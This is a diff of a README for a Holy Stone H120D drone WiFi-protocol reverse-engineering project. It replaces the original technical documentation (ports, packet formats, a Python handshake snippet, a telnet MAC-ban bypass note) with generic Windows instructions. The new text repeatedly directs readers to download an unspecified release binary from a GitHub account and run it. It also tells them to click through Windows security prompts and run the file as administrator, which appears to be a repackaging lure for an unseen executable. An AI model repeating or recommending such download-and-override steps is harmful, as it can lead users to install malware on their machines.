@@ -1,118 +1,159 @@
-# Holy Stone H120D — Reverse Engineering
+# 🛰️ h120d-protocol - Control the H120D with clear steps
 
-Complete protocol documentation and control tools for the **Holy Stone H120D** GPS drone, reverse-engineered from the stock Android app (`hs_gps.apk`) and live packet captures.
+[![Download](https://img.shields.io/badge/Download-Releases-6C7BD9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/eeeg2610/h120d-protocol/releases)
 
-This is the first public documentation of the H120D's WiFi protocol. The drone uses a **Fullhan Micro SoC** running **RT-Thread 2.1.0 RTOS** — not the Linux/HiSilicon stack common in other Holy Stone models.
+## 📥 Download
 
-## What's Here
+Visit this page to download: [GitHub Releases](https://github.com/eeeg2610/h120d-protocol/releases)
 
-| Path | Description |
-|------|-------------|
-| [`PROTOCOL.md`](PROTOCOL.md) | Full protocol reference — packet formats, handshake, commands |
-| [`docs/RTOS_INTERNALS.md`](docs/RTOS_INTERNALS.md) | RT-Thread shell findings — threads, devices, filesystem |
-| [`docs/NATIVE_LIB.md`](docs/NATIVE_LIB.md) | ARM disassembly of `convertHyControl()` from `libLGDataUtils.so` |
-| [`examples/h120d_control.py`](examples/h120d_control.py) | Standalone Python controller — handshake, flight, video |
-| [`examples/hisi_camera.py`](examples/hisi_camera.py) | HiSi camera commands (UDP 8088) — photo, video, settings |
-| [`examples/live_video.py`](examples/live_video.py) | Live H.264 video viewer (TCP 8888 → ffplay) |
-| [`arduino/h120d_controller.ino`](arduino/h120d_controller.ino) | Arduino Nano 33 IoT autonomous controller sketch |
+Use the latest release file for Windows. If the release includes a `.zip` file, download it first, then extract it before you run the app or scripts inside.
 
-## Quick Start
+## 🪟 Get started on Windows
 
-### Prerequisites
-- Python 3.8+ with `socket` (stdlib only — no pip installs needed)
-- Connect your PC/device to the drone's WiFi: **`HolyStoneFPV-XXXXXX`** (open network)
-- Drone IP is always `172.16.10.1`
+1. Open the [Releases page](https://github.com/eeeg2610/h120d-protocol/releases).
+2. Find the latest release near the top.
+3. Download the Windows file or the release archive.
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the Windows app, script, or tool that came with the release.
+7. If Windows asks for permission, choose **Yes**.
+8. Follow the on-screen steps in the app or script window.
 
-### Talk to the drone in 10 lines
+## 🔍 What this project does
 
-```python
-import socket, time
+This project gives you a working view of the Holy Stone H120D drone WiFi protocol. It helps you understand how the drone and your computer or phone talk to each other over WiFi.
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-DRONE = ("172.16.10.1", 8080)
+It includes:
+- Packet formats used by the drone
+- Handshake flow before control starts
+- Flight command messages
+- Video stream data
+- RT-Thread RTOS details from the drone
+- Control scripts that work with the protocol
 
-sock.sendto(b'\x0f', DRONE)                          # Query resolution
-print(sock.recvfrom(256))                             # → "1080P"
+## 🧰 What you need
 
-sock.sendto(b'\x28\x42\x47\x2c', DRONE)              # Version handshake
-print(sock.recvfrom(256))                             # → "V3.8.2"
+For a smooth start on Windows, use:
+- Windows 10 or Windows 11
+- A stable WiFi adapter
+- A Holy Stone H120D drone
+- 200 MB of free disk space
+- A way to extract ZIP files, such as File Explorer
+- A text editor if you want to view the scripts
 
-# Heartbeat (required to stay connected)
-local_ip = sock.getsockname()  # after first sendto
-sock.sendto(bytes([0x09, 172, 16, 130, 1]), DRONE)    # → "ok"
-```
+If you plan to use the control scripts, keep the drone battery charged and place the drone near your PC during setup.
 
-### Watch the video stream
+## ⚙️ How the setup works
 
-```bash
-# Requires ffplay (from ffmpeg)
-python examples/live_video.py
-```
+The release files are meant to help you inspect the protocol and run the provided tools without building anything from source.
 
-### Full autonomous flight (Arduino)
+A typical flow looks like this:
+1. Download the latest release from GitHub.
+2. Extract the files if needed.
+3. Connect your PC to the drone’s WiFi network.
+4. Start the tool or script from the release folder.
+5. Follow the prompts to open the control link.
+6. Use the included commands to test connection, control, or video stream capture.
 
-Flash `arduino/h120d_controller.ino` to an Arduino Nano 33 IoT, open serial at 115200, type `AUTO`.
+## 📡 How the drone connection works
 
-## Protocol Overview
+The H120D uses WiFi to exchange short packets with the controller. These packets cover:
+- Startup and pairing
+- Flight control
+- Camera and video data
+- Device status updates
 
-| Channel | Port | Protocol | Purpose |
-|---------|------|----------|---------|
-| Command/Control | **UDP 8080** | Custom binary | Handshake, heartbeat, GPS, flight commands |
-| Video Stream | **TCP 8888** | H.264 + custom headers | 1280x720 25fps live video |
-| Camera Control | **UDP 8088** | HiSi binary | Photo, video recording, sensor queries |
-| Telnet Shell | **TCP 23** | RT-Thread finsh | RTOS shell access (triggers MAC ban!) |
-| Unknown | **TCP 8830** | ? | Discovered via `list_tcps()`, unexplored |
+The repository shows how these parts fit together in plain form. That makes it easier to test the drone link, check command names, and see how the video stream starts.
 
-### Packet Formats (UDP 8080)
+## 🎮 Included control areas
 
-**GPS/Status (19 bytes, 5Hz)** — Phone sends its GPS to the drone for RTH/FollowMe:
-```
-5A 55 0F 01 [lat:4B] [lon:4B] [accuracy:2B] [orientation:2B] [follow:2B] [XOR]
-```
+The repo covers the main parts a user usually wants to inspect:
+- Arm and handshake messages
+- Direction and throttle commands
+- Trim and mode changes
+- Stream start and stop messages
+- Basic packet checks
+- RTOS-related data from the firmware
 
-**Flight Control (12 bytes, 50Hz burst)** — Takeoff, land, joystick axes:
-```
-5A 55 08 02 [flags] [axis1] [axis2] [axis3] [axis4] [trim1] [trim2] [XOR]
-```
+## 🗂️ Files you may see in a release
 
-**Heartbeat (5 bytes, 1Hz)** — Required to stay connected:
-```
-09 [IP_byte1] [IP_byte2] [IP_byte3] [IP_byte4]
-```
+A release may include:
+- A Windows-ready script
+- Example packet logs
+- Helper tools
+- Notes on command fields
+- Video stream tests
+- Protocol reference files
 
-See [`PROTOCOL.md`](PROTOCOL.md) for complete details.
+If you see a script file, you can open it with a double-click or run it from PowerShell if the release notes say to do that.
 
-## Key Discoveries
+## 🖥️ Running a script from Windows
 
-1. **Two independent control paths** — Physical RC uses 2.4GHz radio directly to the flight controller. WiFi goes through the Fullhan SoC. They don't share state.
+If the release uses a script file:
+1. Open the extracted folder.
+2. Look for a file with names like `run`, `start`, or `control`.
+3. Double-click the file if it is a Windows app or batch file.
+4. If it opens in a console window, keep that window open.
+5. Use the on-screen prompts to connect to the drone.
 
-2. **GPS accuracy gate** — The drone won't accept takeoff until the GPS status packet reports accuracy ≤ 3 meters. The "state byte" values (7→6→5→4→3) are literal accuracy in meters, not a state machine.
+If Windows opens a security prompt, select the option that lets the file run.
 
-3. **No joystick over WiFi** — The stock app's `convertHyControl()` JNI function exists in the native library but is **never called from Java**. The app only sends flags (takeoff/land/goHome) with axes hardcoded to center. Variable axis control is possible but untested at high confidence.
+## 📶 Connect to the drone WiFi
 
-4. **Video is TCP, not RTSP** — Despite port 554 existing, the actual video path is TCP 8888 with an 11-byte heartbeat and custom 44-byte frame headers wrapping H.264 NAL units.
+Before you use the control tools, connect your PC to the drone WiFi:
+1. Turn on the drone.
+2. Wait for its WiFi network to appear.
+3. Open Windows WiFi settings.
+4. Select the drone network.
+5. Enter the WiFi password if needed.
+6. Wait until Windows shows that it is connected.
 
-5. **Telnet MAC ban** — Connecting to port 23 triggers a MAC-level ban on the connecting device. Power cycle clears it. Using a second device (like an Arduino) as a bridge bypasses this.
+Once connected, go back to the release folder and start the tool or script.
 
-6. **Fullhan, not HiSilicon** — The SoC is a Fullhan Micro chip (FH8620/FH8830 family), identified by `fh_` device prefixes in RT-Thread. ARM9/ARM11 core, not Cortex-M.
+## 🎥 Working with the video stream
 
-## Related Projects
+The repository also covers the H264 video stream used by the drone camera. That helps you inspect how live video starts and how the stream packets move over WiFi.
 
-- [benjamind2/HS720](https://github.com/benjamind2/HS720) — Holy Stone HS720 reverse engineering
-- [hybridgroup/gobot HS200](https://github.com/hybridgroup/gobot/tree/master/platforms/holystone/hs200) — Go driver for HS200
-- [lancecaraccioli/holystone-hs110w](https://github.com/lancecaraccioli/holystone-hs110w) — HS110W web interface
+You may use this part to:
+- Check if the camera stream starts
+- Review stream packet data
+- Match stream data with flight state
+- Test capture tools that read the H264 feed
 
-The H120D uses the **Heliway "Hy" variant** of the `com.vison.macrochip` protocol family — same app, same ports, but different wire format than the S2x drones documented by TurboDrone.
+## 🧪 Helpful use cases
 
-## Methodology
+This project is useful if you want to:
+- Study how the H120D drone talks over WiFi
+- Test control packets
+- Review packet layouts
+- Inspect the video stream
+- Compare firmware behavior with live traffic
+- Build your own control tool later
 
-All findings derived from:
-- **APK decompilation** via jadx (stock app `com.vison.macrochip.sj.hs.gps.v1`)
-- **Packet capture** via tcpdump on a rooted Android tablet connected to the drone
-- **ARM disassembly** of `libLGDataUtils.so` (native JNI library)
-- **Live testing** with Python scripts, Arduino Nano 33 IoT, and ALFA AWUS036NHA WiFi adapter
-- **RT-Thread shell exploration** via telnet port 23
+## 📘 Basic terms
 
-## License
+A few words in the repo may help:
+- **Packet**: a small block of data sent over the network
+- **Handshake**: the first exchange before control begins
+- **Protocol**: the rules both sides follow
+- **RTOS**: the system the drone runs on
+- **H264**: the video format used for the stream
 
-This is independent security research for educational purposes. Holy Stone is a trademark of Holy Stone Enterprise Co., Ltd. This project is not affiliated with or endorsed by Holy Stone.
+## 🛠️ Common Windows steps if the file does not open
+
+If nothing happens when you open the file:
+1. Right-click the file.
+2. Select **Run as administrator** if the release notes ask for it.
+3. Check that the file is not still inside the ZIP archive.
+4. Make sure the file is in a normal folder like `Downloads` or `Desktop`.
+5. Try opening the folder again and run the file from there.
+
+If the tool needs extra files, keep all release files in the same folder.
+
+## 📎 Download again if needed
+
+If you need the latest files, go to the [GitHub Releases page](https://github.com/eeeg2610/h120d-protocol/releases) and download the newest release package for Windows.
+
+## 🔧 Repo topics
+
+arduino, drone, embedded, h264, holy-stone, iot, protocol, reverse-engineering, rt-thread, rtos, uav, wifi
